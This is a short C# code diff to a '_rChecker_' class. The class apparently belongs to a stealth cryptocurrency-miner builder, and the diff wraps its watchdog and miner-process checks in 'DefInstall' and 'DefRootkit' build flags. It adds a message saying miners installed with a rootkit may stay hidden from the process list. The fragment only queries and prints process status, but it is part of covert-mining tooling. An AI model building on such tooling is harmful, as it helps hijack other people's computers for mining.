@@ -26,6 +26,7 @@ public partial class _rChecker_
             {
                 Console.WriteLine("Not run as Administrator, only non-administrator miners can be searched for.");
             }
+#if DefInstall
             var _rconnection_ = new ConnectionOptions();
             _rconnection_.Impersonation = ImpersonationLevel.Impersonate;
             var _rscope_ = new ManagementScope(@"\root\cimv2", _rconnection_);
@@ -42,7 +43,10 @@ public partial class _rChecker_
                 }
             }
             Console.WriteLine("Watchdog Running: " + (_rwdrunning_ ? "Yes" : "No"));
-
+#endif
+#if DefRootkit
+            Console.WriteLine("Miner is installed with rootkit, miners might not always appear in the list below even though they might be running.");
+#endif
             Console.WriteLine("Miners:");
             _rsearcher_ = new ManagementObjectSearcher(_rscope_, new ObjectQuery("Select CommandLine from Win32_Process")).Get();
             foreach (ManagementObject _rmemObj_ in _rsearcher_)
